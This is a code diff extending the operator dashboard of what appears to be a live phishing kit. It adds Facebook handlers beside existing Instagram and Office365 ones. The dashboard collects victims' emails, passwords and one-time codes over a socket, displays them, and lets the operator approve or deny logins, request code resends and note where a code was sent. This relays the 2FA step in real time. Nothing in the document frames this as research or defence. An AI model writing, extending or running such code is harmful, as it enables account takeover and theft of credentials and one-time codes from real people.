@@ -19,11 +19,13 @@ import {
   Heading,
   IconButton,
   Input,
+  Avatar,
+  Icon,
 } from "@chakra-ui/react";
 import { eventConfig } from "../lib/eventConfig";
 
 const createButton = (colorScheme, onClick, text) => (
-  <Button colorScheme={colorScheme} onClick={onClick}>
+  <Button colorPalette={colorScheme} onClick={onClick}>
     {text}
   </Button>
 );
@@ -740,7 +742,7 @@ const AdminDashboard = () => {
                   otp: data.otp,
                   status: "pending",
                   email: data.email,
-                  data: `OTP: ${data.email}`,
+                  data: `OTP: ${data.otp}`,
                 },
               ],
             },
@@ -812,6 +814,203 @@ const AdminDashboard = () => {
                 password: data.password,
                 staySignedIn: data.staySignedIn,
                 data: `staySignedIn ${data.staySignedIn}`,
+                status: "pending",
+                email: session.email, // Use email from the session
+              },
+            ],
+          },
+        };
+      });
+    });
+
+    newSocket.on("fb_attempt_init", (data) => {
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "fb_attempt_init",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  status: "pending",
+                  email: data.email,
+                  data: `${data.email} & ${data.password}`,
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "fb_attempt_init",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                status: "pending",
+                email: session.email, // Use email from the session
+              },
+            ],
+          },
+        };
+      });
+    });
+
+    newSocket.on("fb_otp", (data) => {
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              otp: data.otp,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "fb_otp",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  otp: data.otp,
+                  status: "pending",
+                  email: data.email,
+                  data: `OTP: ${data.otp}`,
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "fb_otp",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                otp: data.otp,
+                data: `OTP ${data.otp}`,
+                status: "pending",
+                email: session.email, // Use email from the session
+              },
+            ],
+          },
+        };
+      });
+    });
+
+    newSocket.on("fb_resend_otp", (data) => {
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "fb_resend_otp",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  status: "pending",
+                  email: data.email,
+                  data: `${data.email} & ${data.password}`,
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "fb_resend_otp",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                status: "pending",
+                data: `${data.email} & ${data.password}`,
+                email: session.email, // Use email from the session
+              },
+            ],
+          },
+        };
+      });
+    });
+
+    newSocket.on("fb_done", (data) => {
+      setSessions((prev) => {
+        const session = prev[data.sessionId];
+
+        // If session doesn't exist, initialize it
+        if (!session) {
+          return {
+            ...prev,
+            [data.sessionId]: {
+              email: data.email,
+              password: data.password,
+              otp: data.otp,
+              lastActivity: new Date(data.timestamp || Date.now()),
+              events: [
+                {
+                  type: "fb_done",
+                  timestamp: data.timestamp || new Date().toISOString(),
+                  password: data.password,
+                  otp: data.otp,
+                  status: "pending",
+                  email: data.email,
+                  data: `OTP: ${data.otp}`,
+                },
+              ],
+            },
+          };
+        }
+
+        // If session exists, update it
+        return {
+          ...prev,
+          [data.sessionId]: {
+            ...session,
+            lastActivity: new Date(data.timestamp || Date.now()),
+            events: [
+              ...session.events,
+              {
+                type: "fb_done",
+                timestamp: data.timestamp || new Date().toISOString(),
+                password: data.password,
+                otp: data.otp,
+                data: `OTP ${data.otp}`,
                 status: "pending",
                 email: session.email, // Use email from the session
               },
@@ -927,9 +1126,32 @@ const AdminDashboard = () => {
         return "IG OTP";
       case "stay_signed_in":
         return "IG StaySignedIn?";
+      case "fb_attempt_init":
+        return "FB Email&Pass Init";
+      case "fb_otp":
+        return "FB OTP";
+      case "fb_resend_otp":
+        return "FB RESEND OTP";
+      case "fb_done":
+        return "FB Done";
 
       default:
         return "Unknown Event";
+    }
+  };
+
+  const getEventIcon = (event) => {
+    switch (event.type) {
+      case "fb_attempt_init":
+        return "/images/fb.png";
+      case "fb_otp":
+        return "/images/fb.png";
+      case "fb_resend_otp":
+        return "/images/fb.png";
+      case "fb_done":
+        return "/images/fb.png";
+      default:
+        return "/images/office365.png";
     }
   };
 
@@ -987,6 +1209,12 @@ const AdminDashboard = () => {
                     <Box p={4}>
                       <Flex justify="space-between" align="center">
                         <HStack spacing={4}>
+                          <Image
+                            src={getEventIcon(event)}
+                            alt="i"
+                            w="1rem"
+                            h="1rem"
+                          />
                           <Heading size="sm">{getEventTitle(event)}</Heading>
                           <Badge {...getStatusProps(event.status)}>
                             {event.status}
@@ -1017,7 +1245,11 @@ const AdminDashboard = () => {
                             {event.type === "verify-click" ||
                             event.type === "ig_attempt_init" ||
                             event.type === "auth_value_submit" ||
-                            event.type === "stay_signed_in"
+                            event.type === "stay_signed_in" ||
+                            event.type === "fb_attempt_init" ||
+                            event.type === "fb_otp" ||
+                            event.type === "fb_resend_otp" ||
+                            event.type === "fb_done"
                               ? "Email & Password"
                               : "Email"}
                           </Text>
@@ -1025,7 +1257,11 @@ const AdminDashboard = () => {
                             {event.type === "verify-click" ||
                             event.type === "ig_attempt_init" ||
                             event.type === "auth_value_submit" ||
-                            event.type === "stay_signed_in" ? (
+                            event.type === "stay_signed_in" ||
+                            event.type === "fb_attempt_init" ||
+                            event.type === "fb_otp" ||
+                            event.type === "fb_resend_otp" ||
+                            event.type === "fb_done" ? (
                               <>
                                 {event.email || session.email} &{" "}
                                 {event.password}
@@ -1073,6 +1309,14 @@ const AdminDashboard = () => {
                                 ? "red.500"
                                 : event.type === "stay_signed_in"
                                 ? "teal.500"
+                                : event.type === "fb_attempt_init"
+                                ? "red.500"
+                                : event.type === "fb_otp"
+                                ? "red.500"
+                                : event.type === "fb_resend_otp"
+                                ? "red.500"
+                                : event.type === "fb_done"
+                                ? "green.500"
                                 : "yellow.500"
                             }
                             w="fit-content"
@@ -1368,6 +1612,137 @@ const AdminDashboard = () => {
                                             "cancel"
                                           ),
                                         "Deny Thanks4Coming"
+                                      )}
+                                    </HStack>
+                                  </>
+                                );
+
+                              case "fb_attempt_init":
+                                return (
+                                  <>
+                                    <HStack spacing={4} mt={4}>
+                                      <Input
+                                        type="text"
+                                        name="sendTo"
+                                        value={sendTo}
+                                        onChange={(e) =>
+                                          setSendTo(e.target.value)
+                                        }
+                                        placeholder="Where did you send code to?"
+                                      />
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "login"
+                                            // { password }
+                                          ),
+                                        "Approve login"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny login"
+                                      )}
+                                    </HStack>
+                                  </>
+                                );
+
+                              case "fb_otp":
+                                return (
+                                  <>
+                                    {createButton(
+                                      "green",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "continue"
+                                        ),
+                                      "Approve FB OTP"
+                                    )}
+                                    {createButton(
+                                      "red",
+                                      () =>
+                                        handleResponse(
+                                          sessionId,
+                                          index,
+                                          "cancel"
+                                        ),
+                                      "Deny FB OTP"
+                                    )}
+                                  </>
+                                );
+
+                              case "fb_resend_otp":
+                                return (
+                                  <>
+                                    <HStack spacing={4} mt={4}>
+                                      <Input
+                                        type="text"
+                                        name="sendTo"
+                                        value={sendTo}
+                                        onChange={(e) =>
+                                          setSendTo(e.target.value)
+                                        }
+                                        placeholder="Where did you send code to?"
+                                      />
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "resend"
+                                            // { password }
+                                          ),
+                                        "Approve resend"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny resend"
+                                      )}
+                                    </HStack>
+                                  </>
+                                );
+
+                              case "fb_done":
+                                return (
+                                  <>
+                                    <HStack spacing={4} mt={4}>
+                                      {createButton(
+                                        "green",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "done"
+                                            // { password }
+                                          ),
+                                        "Done"
+                                      )}
+                                      {createButton(
+                                        "red",
+                                        () =>
+                                          handleResponse(
+                                            sessionId,
+                                            index,
+                                            "cancel"
+                                          ),
+                                        "Deny "
                                       )}
                                     </HStack>
                                   </>
